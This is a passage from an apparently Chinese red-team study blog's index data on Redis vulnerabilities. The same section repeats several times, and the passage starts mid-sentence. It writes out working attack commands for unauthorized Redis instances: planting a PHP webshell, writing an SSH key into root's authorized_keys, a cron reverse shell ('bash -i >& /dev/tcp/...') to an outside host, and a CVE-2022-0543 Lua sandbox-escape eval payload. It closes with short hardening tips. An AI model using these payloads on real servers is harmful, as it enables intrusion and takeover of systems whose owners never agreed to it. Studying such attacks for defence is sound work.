//\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3redis写入ssh公钥登录"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4写入计划任务反弹shell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#5主从复制rce"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#6ssrfredis写入webshell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 